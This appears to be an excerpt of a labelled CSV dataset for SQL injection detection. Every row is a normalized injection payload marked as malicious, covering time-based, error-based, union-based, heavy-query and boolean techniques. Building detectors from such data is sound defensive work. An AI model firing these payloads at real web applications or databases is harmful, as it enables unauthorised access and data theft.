row_index,payload_norm,label,sqli_type_hint
3840,"1"" ) where 8196 = 8196",1,
3841,1 ) where 2010 = 2010,1,
3842,"1%"" ) ) ) and sleep ( 5 ) #",1,
3843,"1%"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""%"" = """,1,
3844,1%' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
3845,1' ) where 6045 = 6045,1,
3846,select ( case when ( 9393 = 5530 ) then 9393 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
3847,"1"" ) where 2702 = 2702 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,
3848,"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""ctrr"" = ""ctrr",1,
3849,-8187' ) ) ) or 1698 = 2823#,1,
3850,"-3347%"" or 9323 = 9323#",1,
3851,"1%"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
3852,"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'skdm' = 'skdm",1,
3853,1' ) ) as qaki where 5272 = 5272,1,
3854,1'|| ( select 'bqhi' from dual where 7409 = 7409,1,
3855,"-2325 ) union all select 4692,4692,4692,4692#",1,
3856,"-1418"" ) where 7528 = 7528 order by 1#",1,
3857,"1%' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( '%' = '",1,
3858,1' ) ) as tley where 3539 = 3539,1,
3859,( select ( case when ( 6461 = 1802 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual ),1,
3860,"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""ilge"" like ""ilge",1,
3861,-6518' ) ) as vocx where 2539 = 2539 or ( 8652 = 2025 ) *2025--,1,
3862,"1%"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3863,"1%' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( '%' = '",1,
3864,"1%"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""%"" = """,1,
3865,"1"" ) as fkco where 8877 = 8877 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
3866,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""ewsr"" like ""ewsr",1,
3867,"1"" ) ) and 5421 = 4804--",1,
3868,1'|| ( select 'zzkx' where 3270 = 3270 and 2006 = 2006,1,
3869,"( select ( case when ( 3531 = 3531 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 3531 end ) )",1,
